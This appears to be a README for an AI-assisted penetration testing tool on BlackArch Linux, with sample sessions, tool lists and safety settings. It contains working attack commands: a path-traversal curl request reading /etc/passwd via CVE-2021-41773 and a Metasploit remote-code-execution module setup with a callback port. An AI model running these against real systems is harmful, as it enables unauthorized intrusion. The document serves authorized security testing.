# FRIDAY AI - BlackArch Pentest Guide

## Overview
Professional penetration testing assistant for BlackArch Linux.

**Workflow**: AI Suggests → Human Approves → Tool Executes → AI Analyzes

## Installation

### 1. Deploy to BlackArch
```bash
cd /path/to/FRIDAY
chmod +x deploy_blackarch.sh
./deploy_blackarch.sh
```

### 2. Activate Environment
```bash
cd python_backend
source venv/bin/activate
```

### 3. Start Pentest Mode
```bash
python automation/pentest_cli.py
```

## Usage Examples

### Reconnaissance
```
[FRIDAY Pentest]> scan 192.168.1.100

[AI] Suggesting reconnaissance approach:
     - Tool: nmap -sV -sC -T4 192.168.1.100
     - Purpose: Service detection and version enumeration
     
[APPROVAL REQUIRED] Execute suggested action? [y/N]: y

[EXECUTING] Running nmap scan...
[ANALYSIS] Found 3 open ports:
  - 22/tcp (SSH - OpenSSH 7.4)
  - 80/tcp (HTTP - Apache 2.4.49)
  - 3306/tcp (MySQL - 5.7.33)
```

### Vulnerability Assessment
```
[FRIDAY Pentest]> vuln 192.168.1.100

[AI] Cross-referencing services with CVE database...
[CRITICAL] Apache 2.4.49 - CVE-2021-41773 (Path Traversal)
[HIGH] OpenSSH 7.4 - CVE-2018-15473 (Username Enumeration)

[AI] Suggested tools:
  1. Test path traversal: curl http://192.168.1.100/cgi-bin/.%2e/.%2e/.%2e/etc/passwd
  2. Enumerate users: ssh-enum-users.py -t 192.168.1.100

[APPROVAL REQUIRED] Execute tests? [y/N]:
```

### AI-Powered Analysis
```
[FRIDAY Pentest]> analyze

[AI] Analyzing collected reconnaissance data...

RISK ASSESSMENT: HIGH
- Critical vulnerabilities detected on web server
- Outdated SSH version allows user enumeration
- MySQL exposed to network (should be localhost only)

ATTACK SURFACE:
1. Web Application (Priority: Critical)
   - Path traversal exploit available
   - Potential RCE via Apache bug
   
2. SSH Service (Priority: Medium)
   - Username enumeration possible
   - Recommend trying default/weak credentials
   
3. Database (Priority: Low)
   - Not directly exploitable without credentials
   - May be accessible via web app SQLi

TOP RECOMMENDATIONS:
1. Attempt path traversal on Apache
2. Enumerate valid usernames via SSH
3. Check web app for SQL injection
```

### Generate Report
```
[FRIDAY Pentest]> report

[AI] Generating professional pentest report...

Report saved to: pentest_reports/report_192.168.1.100_2025-01-27.pdf

Contents:
- Executive Summary
- Detailed Findings (with CVEs)
- Proof of Concepts
- Remediation Steps
- Risk Ratings
```

## BlackArch Tool Integration

The AI can suggest and coordinate 2600+ BlackArch tools:

### Web Application Testing
- **Nikto**: `nikto -h http://target.com`
- **SQLMap**: `sqlmap -u "http://target.com?id=1"`
- **Burp Suite**: Launch and configure automatically

### Network Testing
- **Aircrack-ng**: WiFi security testing
- **Wireshark**: Packet analysis
- **Ettercap**: MITM attacks

### Exploitation
- **Metasploit**: Suggested modules based on findings
- **BeEF**: Browser exploitation (with approval)
- **Social Engineer Toolkit**: Phishing campaigns

## Safety Features

### 1. Human Approval Required
All destructive operations require explicit confirmation:
```
[APPROVAL REQUIRED] This will attempt to exploit the target. Continue? [y/N]:
```

### 2. Audit Logging
All commands logged to `pentest_reports/audit.log`:
```
2025-01-27T10:30:45 | scan 192.168.1.100
2025-01-27T10:32:12 | vuln 192.168.1.100
2025-01-27T10:35:00 | APPROVED: exploit Apache path traversal
```

### 3. Scope Enforcement
Configure allowed targets in `config_blackarch.json`:
```json
{
    "allowed_targets": ["192.168.1.0/24"],
    "forbidden_targets": ["8.8.8.8"],
    "approval_required": true
}
```

## Advanced: Metasploit Integration

### Enable MSF RPC
```bash
msfrpcd -P YourPassword -U msf -a 127.0.0.1
```

### Use AI to Coordinate
```
[FRIDAY Pentest]> suggest metasploit for Apache 2.4.49

[AI] Recommended Metasploit module:
     use exploit/multi/http/apache_normalize_path_rce
     set RHOSTS 192.168.1.100
     set LHOST your_ip
     set LPORT 4444
     exploit

[APPROVAL REQUIRED] Launch Metasploit with these settings? [y/N]:
```

## Compliance & Ethics

### Legal Use Only
- ✅ Authorized penetration tests
- ✅ Bug bounty programs
- ✅ Your own infrastructure
- ❌ Unauthorized access
- ❌ Malicious activities

### Professional Standards
Follows industry frameworks:
- OWASP Testing Guide
- PTES (Penetration Testing Execution Standard)
- OSSTMM (Open Source Security Testing Methodology Manual)

### Evidence Collection
All findings documented with:
- Screenshots
- Command output
- Timestamps
- Proof of concepts

## Troubleshooting

### LLM Not Loading
```bash
# Check model path in pentest_cli.py
# Download model if needed
wget https://huggingface.co/TheBloke/llama-2-7B-GGUF
```

### Tool Not Found
```bash
# Install missing BlackArch tool
sudo pacman -S <tool-name>
```

### Permission Errors
```bash
# Some tools require root
sudo python automation/pentest_cli.py
```

## Next Steps

1. **Configure Targets**: Edit `config_blackarch.json`
2. **Run First Scan**: Test on your own VM
3. **Review Reports**: Check `pentest_reports/`
4. **Iterate**: Let AI suggest next steps based on findings

Remember: **AI Suggests → You Approve → Tool Executes → AI Analyzes**
